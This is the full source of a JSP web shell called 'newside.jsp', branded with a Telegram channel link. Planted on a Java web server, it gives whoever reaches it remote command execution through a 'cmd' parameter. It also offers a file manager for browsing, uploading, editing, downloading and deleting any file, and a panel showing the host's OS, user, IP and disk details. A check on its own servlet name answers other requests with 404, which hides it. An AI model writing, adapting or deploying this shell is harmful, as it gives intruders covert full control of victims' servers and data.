<%@ page import="java.io.*" %>
<%@ page import="java.net.URLEncoder" %>
<% String errorMessage = null; %>
<%
    String expectedShellName = "newside.jsp";
    String currentShellName = request.getServletPath();
    if (currentShellName == null || !currentShellName.toLowerCase().endsWith(expectedShellName.toLowerCase())) {
        response.sendError(404);
        return;
    }
%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String shellName = "newside.jsp";
    String rootPath = application.getRealPath("/");
    if (rootPath == null) {
        rootPath = "/";
    }
    String pathParam = request.getParameter("path");
    String osName = System.getProperty("os.name").toLowerCase();
    boolean isWindows = osName.contains("windows");
    if (pathParam != null) {
        pathParam = pathParam.trim();
        if (!pathParam.isEmpty()) {
            if (isWindows) {
                pathParam = pathParam.replace("/", "\\");
                if (pathParam.matches("^[A-Za-z]:$")) {
                    pathParam += "\\";
                }
            } else {
                pathParam = pathParam.replace("\\", "/");
                if (pathParam.matches("^[A-Za-z]:.*")) {
                    pathParam = "/";
                }
            }
        }
    }
    String currentPath = (pathParam != null && !pathParam.isEmpty()) ? pathParam : (isWindows ? "C:\\" : "/");
    File currentDir = new File(currentPath);
    if (!currentDir.exists() || !currentDir.isDirectory()) {
        errorMessage = "Invalid or inaccessible directory: " + currentPath;
    }
    String action = request.getParameter("action");
    String target = request.getParameter("target");
    String message = "";
    String commandResult = "";
    String messageParam = request.getParameter("message");
    if (messageParam != null) {
        message = messageParam;
    }
    if ("delete".equals(action) && target != null) {
        File f = new File(currentDir, target);
        if (f.exists() && f.isFile()) {
            f.delete();
        }
        response.sendRedirect(shellName + "?path=" + URLEncoder.encode(currentPath, "UTF-8"));
        return;
    }
    if ("download".equals(action) && target != null) {
        File downloadFile = new File(currentDir, target);
        if (downloadFile.exists() && downloadFile.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + downloadFile.getName() + "\"");
            response.setContentLength((int) downloadFile.length());
            InputStream in = null;
            OutputStream outputStream = null;
            try {
                in = new FileInputStream(downloadFile);
                outputStream = response.getOutputStream();
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
            } catch (Exception e) {
                message = "Download failed: " + e.getMessage();
                response.sendRedirect(shellName + "?path=" + URLEncoder.encode(currentPath, "UTF-8") + "&message=" + URLEncoder.encode(message, "UTF-8"));
                return;
            } finally {
                if (in != null) {
                    try { in.close(); } catch (IOException e) { /* ignore */ }
                }
                if (outputStream != null) {
                    try { outputStream.close(); } catch (IOException e) { /* ignore */ }
                }
            }
            return;
        } else {
            message = "File not found: " + target;
            response.sendRedirect(shellName + "?path=" + URLEncoder.encode(currentPath, "UTF-8") + "&message=" + URLEncoder.encode(message, "UTF-8"));
            return;
        }
    }
    if ("upload".equals(action) && "POST".equalsIgnoreCase(request.getMethod())) {
        try {
            String contentType = request.getContentType();
            if (contentType != null && contentType.startsWith("multipart/form-data")) {
                String boundary = contentType.substring(contentType.indexOf("boundary=") + 9);
                if (boundary.startsWith("\"") && boundary.endsWith("\"")) {
                    boundary = boundary.substring(1, boundary.length() - 1);
                }
                boundary = "--" + boundary;
                InputStream in = request.getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = in.read(buffer)) > 0) {
                    baos.write(buffer, 0, len);
                }
                in.close();
                byte[] data = baos.toByteArray();
                String dataStr = new String(data, "ISO-8859-1");
                int fileNameIndex = dataStr.indexOf("filename=\"");
                if (fileNameIndex < 0) {
                    message = "Filename not found in multipart data.";
                } else {
                    int start = fileNameIndex + 10;
                    int end = dataStr.indexOf("\"", start);
                    String fileName = dataStr.substring(start, end);
                    fileName = new File(fileName).getName();
                    int dataStart = dataStr.indexOf("\r\n\r\n", end) + 4;
                    int boundaryIndex = dataStr.indexOf(boundary, dataStart) - 2;
                    if (boundaryIndex < dataStart) {
                        message = "Upload data boundaries not found correctly.";
                    } else {
                        int fileDataLength = boundaryIndex - dataStart;
                        File outFile = new File(currentDir, fileName);
                        FileOutputStream fos = new FileOutputStream(outFile);
                        fos.write(data, dataStart, fileDataLength);
                        fos.close();
                        message = "File uploaded successfully: " + fileName;
                    }
                }
            } else {
                message = "Request is not multipart/form-data.";
            }
        } catch (Exception e) {
            message = "Upload failed: " + e.getMessage();
        }
    }
    if ("edit".equals(action) && target != null) {
        File editFile = new File(currentDir, target);
        if (editFile.exists() && editFile.isFile()) {
            if ("POST".equalsIgnoreCase(request.getMethod())) {
                String content = request.getParameter("content");
                if (content != null) {
                    FileWriter fw = null;
                    try {
                        fw = new FileWriter(editFile);
                        fw.write(content);
                    } finally {
                        if (fw != null) {
                            try { fw.close(); } catch (IOException e) { /* ignore */ }
                        }
                    }
                    response.sendRedirect(shellName + "?path=" + URLEncoder.encode(currentPath, "UTF-8"));
                    return;
                }
            } else {
                BufferedReader br = null;
                try {
                    br = new BufferedReader(new FileReader(editFile));
                    StringBuilder fileContent = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        fileContent.append(line).append("\n");
                    }
                    request.setAttribute("fileContent", fileContent.toString());
                } finally {
                    if (br != null) {
                        try { br.close(); } catch (IOException e) { /* ignore */ }
                    }
                }
%>
<!DOCTYPE html>
<html>
<head>
    <title>Edit File - <%= target %></title>
    <style>
        body {
            background: #121212;
            color: #eee;
            font-family: monospace;
            padding: 20px;
        }
        textarea {
            width: 100%;
            height: 500px;
            background: #000;
            color: #fff;
            border: 1px solid #555;
            padding: 10px;
            font-family: monospace;
        }
        button {
            padding: 10px 20px;
            background: #00bcd4;
            color: #000;
            border: none;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #4dd0e1;
        }
    </style>
</head>
<body>
    <h2>Editing: <%= target %></h2>
    <form method="post">
                <%
            String fileContent = (String) request.getAttribute("fileContent");
            if (fileContent == null) fileContent = "";
        %>
        <textarea name="content"><%= fileContent.replace("<", "<").replace(">", ">") %></textarea><br>
        <button type="submit">Save</button>
    </form>
</body>
</html>
<%
                return;
            }
        }
    }
    String execCmd = request.getParameter("cmd");
    if (execCmd != null && !execCmd.trim().isEmpty()) {
        try {
            Process p = Runtime.getRuntime().exec(execCmd, null, currentDir);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            commandResult = sb.toString();
        } catch (Exception e) {
            commandResult = "Error: " + e.getMessage();
        }
    }
%>
<!DOCTYPE html>
<html>
<head>
    <title><%= shellName %> - File Manager</title>
    <style>
        body {
            font-family: 'Consolas', monospace;
            background: #121212;
            color: #eee;
            padding: 15px 30px;
        }
        a {
            color: #4fc3f7;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
            color: #81d4fa;
        }
        .header {
            font-size: 2.4em;
            text-align: center;
            margin-bottom: 25px;
            color: #00bcd4;
        }
        .current-path {
            background: #222;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
            font-size: 1em;
        }
        table {
            width: 100%;
            margin-bottom: 20px;
            border-collapse: collapse;
        }
        th, td {
            padding: 8px;
            border-bottom: 1px solid #333;
        }
        th {
            background: #222;
        }
        tr:hover {
            background: #1e1e1e;
        }
        .actions a {
            margin-right: 10px;
        }
        .actions a.download {
            color: #4caf50;
        }
        .actions a.delete {
            color: #ff5252;
        }
        .message {
            background: #263238;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 5px;
            color: #aed581;
            white-space: pre-wrap;
        }
        form.command-form {
            margin-top: 30px;
            background: #1a1a1a;
            padding: 15px;
            border-radius: 5px;
            display: flex;
            gap: 10px;
            align-items: center;
        }
        input[type=text] {
            flex-grow: 1;
            padding: 10px;
            background: #000;
            color: #fff;
            border: 1px solid #555;
            font-family: 'Consolas', monospace;
        }
        input[type=submit], button {
            padding: 10px 15px;
            background: #00bcd4;
            color: #000;
            font-weight: bold;
            border: none;
            cursor: pointer;
            font-family: 'Consolas', monospace;
        }
        input[type=submit]:hover, button:hover {
            background: #4dd0e1;
        }
        form.upload-form {
            display: flex;
            gap: 10px;
            align-items: center;
            margin-top: 20px;
        }
        form.upload-form input[type=file] {
            cursor: pointer;
            padding: 6px 10px;
            background: #121212;
            color: #4fc3f7;
            border: 1px solid #4fc3f7;
            border-radius: 4px;
            font-family: 'Consolas', monospace;
            font-size: 0.9rem;
        }
        form.upload-form input[type=submit] {
            padding: 8px 16px;
            background: #00bcd4;
            color: #000;
            border: none;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Consolas', monospace;
            font-size: 0.9rem;
        }
        form.upload-form input[type=submit]:hover {
            background: #4dd0e1;
        }
        @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-2px); }
    50% { transform: translateX(2px); }
    75% { transform: translateX(-2px); }
}
a:hover {
    animation: shake 0.3s;
}
@keyframes neonBlink {
    0%, 100% {
        text-shadow:
            0 0 5px #00ffff,
            0 0 10px #00ffff,
            0 0 20px #00ffff,
            0 0 40px #0ff;
        opacity: 1;
    }
    50% {
        text-shadow: none;
        opacity: 0.5;
    }
}
.neon-link {
    font-weight: bold;
    color: #00ffff;
    text-decoration: none;
    animation: neonBlink 2s infinite;
}
    </style>
</head>
<body>
    <div class="header">
        <a href="https://t.me/NEWSlDE" target="_blank" class="neon-link">
            <%= shellName.toUpperCase() %>
        </a>
    </div>
<%
    String osVersion = System.getProperty("os.version");
    String userName = System.getProperty("user.name");
    String javaVersion = System.getProperty("java.version");
    String javaVendor = System.getProperty("java.vendor");
    String serverInfo = application.getServerInfo();
    String ipAddress = request.getLocalAddr();
    String hostName = request.getLocalName();
    File disk = new File("/");
    long freeSpace = disk.getFreeSpace() / (1024 * 1024);
    long totalSpace = disk.getTotalSpace() / (1024 * 1024);
    boolean isWritable = currentDir.canWrite();
    boolean isReadable = currentDir.canRead();
%>
<style>
    .system-info {
        background: #111;
        border-radius: 12px;
        padding: 15px 25px;
        color: #00ffff;
        font-family: monospace;
        font-size: 0.95em;
        box-shadow: 0 0 15px #00ffff88;
        margin-bottom: 25px;
    }
    .system-info b {
        font-size: 1.15em;
        color: #00bcd4;
    }
    .drive-list {
        margin-top: 15px;
        background: #222;
        border-radius: 8px;
        padding: 12px 20px;
        color: #4fc3f7;
        font-family: monospace;
        font-size: 0.95em;
        box-shadow: 0 0 10px #4fc3f7aa;
    }
    .drive-list ul {
        list-style: none;
        padding-left: 0;
    }
    .drive-list ul li {
        margin: 5px 0;
    }
    .drive-list a {
        color: #00bcd4;
        text-decoration: none;
        font-weight: bold;
        transition: color 0.3s ease;
    }
    .drive-list a:hover {
        color: #4dd0e1;
        text-decoration: underline;
    }
</style>
<div class="system-info">
    <b>System Information:</b><br/>
    OS: <%= osName %> (v<%= osVersion %>)<br/>
    Java: <%= javaVersion %> (<%= javaVendor %>)<br/>
    Server: <%= serverInfo %><br/>
    User: <%= userName %><br/>
    Host: <%= hostName %> - IP: <%= ipAddress %><br/>
    Disk: <%= freeSpace %>MB Free / <%= totalSpace %>MB Total<br/>
    Permissions: Read=<%= isReadable %>, Write=<%= isWritable %>
</div>
<% if (isWindows) {
    File[] drives = File.listRoots();
%>
    <div style="margin-bottom: 20px;">
        <div class="drive-list" style="margin-bottom: 8px;">
            <b>Available Drives:</b>
            <ul>
            <% for (File drive : drives) {
                String drivePath = drive.getAbsolutePath();
                if (drivePath.matches("^[A-Za-z]:$")) {
                    drivePath += "\\";
                }
            %>
                <li><a href="<%= shellName %>?path=<%= URLEncoder.encode(drivePath, "UTF-8") %>"><%= drivePath %></a></li>
            <% } %>
            </ul>
        </div>
        <div class="current-path" style="margin-top: 0;">
            Current Path:
            <%
                if (currentPath.equals("/") || currentPath.equals("\\")) {
            %>
                / <a href="<%= shellName %>?path=%2F">root</a>
            <%
                } else {
                    String displayPath = currentPath.replace("\\", "/");
                    String[] parts = displayPath.split("/");
                    String accumPath = "";
                    for (String part : parts) {
                        if (part == null || part.isEmpty()) continue;
                        accumPath += "/" + part;
            %>
                / <a href="<%= shellName %>?path=<%= URLEncoder.encode(accumPath, "UTF-8") %>"><%= part %></a>
            <%
                    }
                }
            %>
        </div>
    </div>
<% } else { %>
    <div class="current-path">
        Current Path:
        <%
            if (currentPath.equals("/") || currentPath.equals("\\")) {
        %>
            / <a href="<%= shellName %>?path=%2F">root</a>
        <%
            } else {
                String displayPath = currentPath.replace("\\", "/");
                String[] parts = displayPath.split("/");
                String accumPath = "";
                for (String part : parts) {
                    if (part == null || part.isEmpty()) continue;
                    accumPath += "/" + part;
        %>
            / <a href="<%= shellName %>?path=<%= URLEncoder.encode(accumPath, "UTF-8") %>"><%= part %></a>
        <%
                }
            }
        %>
    </div>
<% } %>
    <% if (!message.isEmpty()) { %>
        <div class="message"><%= message %></div>
    <% } %>
    <table>
        <thead>
            <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
        </thead>
        <tbody>
        <tr>
            <td colspan="4">
                <a href="<%= shellName %>?path=<%= URLEncoder.encode(rootPath, "UTF-8") %>">[Home Shell]</a>
            </td>
        </tr>
        <%
            File parent = currentDir.getParentFile();
            if (parent != null && !currentPath.equals(parent.getAbsolutePath())) {
        %>
        <tr>
            <td colspan="4">
                <a href="<%= shellName %>?path=<%= URLEncoder.encode(parent.getAbsolutePath(), "UTF-8") %>">[Back]</a>
            </td>
        </tr>
        <%
            }
            File[] files = currentDir.listFiles();
            if (files != null) {
                java.util.List<File> dirs = new java.util.ArrayList<File>();
                java.util.List<File> normalFiles = new java.util.ArrayList<File>();
                for (File f : files) {
                    if (f.isDirectory()) {
                        dirs.add(f);
                    } else {
                        normalFiles.add(f);
                    }
                }
                for (File f : dirs) {
        %>
        <tr>
            <td><a href="<%= shellName %>?path=<%= URLEncoder.encode(f.getAbsolutePath(), "UTF-8") %>"><%= f.getName() %></a></td>
            <td>Directory</td>
            <td>---</td>
            <td class="actions"></td>
        </tr>
        <%
                }
                for (File f : normalFiles) {
                    String name = f.getName();
                    String size = (f.length() / 1024) + " KB";
        %>
        <tr>
            <td><%= name %></td>
            <td>File</td>
            <td><%= size %></td>
            <td class="actions">
                <a href="<%= shellName %>?path=<%= URLEncoder.encode(currentPath, "UTF-8") %>&action=edit&target=<%= URLEncoder.encode(name, "UTF-8") %>">Edit</a>
                <a href="<%= shellName %>?path=<%= URLEncoder.encode(currentPath, "UTF-8") %>&action=download&target=<%= URLEncoder.encode(name, "UTF-8") %>" class="download">Download</a>
                <% String jsSafeName = name.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'"); %>
                <a href="<%= shellName %>?path=<%= URLEncoder.encode(currentPath, "UTF-8") %>&action=delete&target=<%= URLEncoder.encode(name, "UTF-8") %>" class="delete" onclick="return confirm('Delete <%= jsSafeName %>?')">Delete</a>
            </td>
        </tr>
        <%
                }
            } else {
        %>
        <tr><td colspan="4" style="color:red;">No files found or access denied.</td></tr>
        <%
            }
        %>
        </tbody>
    </table>
    <div style="display: flex; gap: 15px; margin-top: 30px; flex-wrap: wrap;">
        <form method="get" class="command-form" style="flex: 1;">
            <input type="hidden" name="path" value="<%= currentPath %>"/>
            <input type="text" name="cmd" placeholder="Enter command to execute" />
            <input type="submit" value="Run" />
        </form>
        <form method="post" enctype="multipart/form-data" action="<%= shellName %>?path=<%= URLEncoder.encode(currentPath, "UTF-8") %>&action=upload" class="upload-form" style="flex: 1;">
            <input type="file" name="file" />
            <input type="submit" value="Upload" />
        </form>
    </div>
    <% if (!commandResult.isEmpty()) { %>
        <div class="message"><%= commandResult %></div>
    <% } %>
    <% if (errorMessage != null) { %>
<style>
#error-popup {
    position: fixed;
    top: 20%;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 188, 212, 0.15); 
    border: 1px solid rgba(0, 188, 212, 0.3);
    box-shadow: 0 8px 32px 0 rgba(0, 188, 212, 0.37);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border-radius: 12px;
    color: #00bcd4;
    font-family: monospace;
    font-size: 1.2em;
    padding: 20px 30px;
    z-index: 9999;
    max-width: 80%;
    text-align: center;
    animation: fadeIn 0.5s ease forwards;
}
#error-popup.hide {
    animation: fadeOut 1s ease forwards;
}
#error-popup button {
    margin-top: 15px;
    padding: 8px 16px;
    background: #00bcd4;
    color: #121212;
    border: none;
    font-weight: bold;
    cursor: pointer;
    border-radius: 6px;
    font-family: monospace;
    transition: background 0.3s ease;
}
#error-popup button:hover {
    background: #4dd0e1;
}
@keyframes fadeIn {
    from { opacity: 0; transform: translateX(-50%) translateY(-10px); }
    to { opacity: 1; transform: translateX(-50%) translateY(0); }
}
@keyframes fadeOut {
    from { opacity: 1; }
    to { opacity: 0; visibility: hidden; }
}
</style>
<div id="error-popup">
    <strong>Error:</strong> <%= errorMessage %><br/>
    <button onclick="closeErrorPopup()">Close</button>
</div>
<script>
    function closeErrorPopup() {
        const popup = document.getElementById('error-popup');
        popup.classList.add('hide');
        setTimeout(() => { popup.style.display = 'none'; }, 1000);
    }
    setTimeout(() => {
        const popup = document.getElementById('error-popup');
        if (popup && !popup.classList.contains('hide')) {
            closeErrorPopup();
        }
    }, 3000);
</script>
<% } %>
</body>
</html>
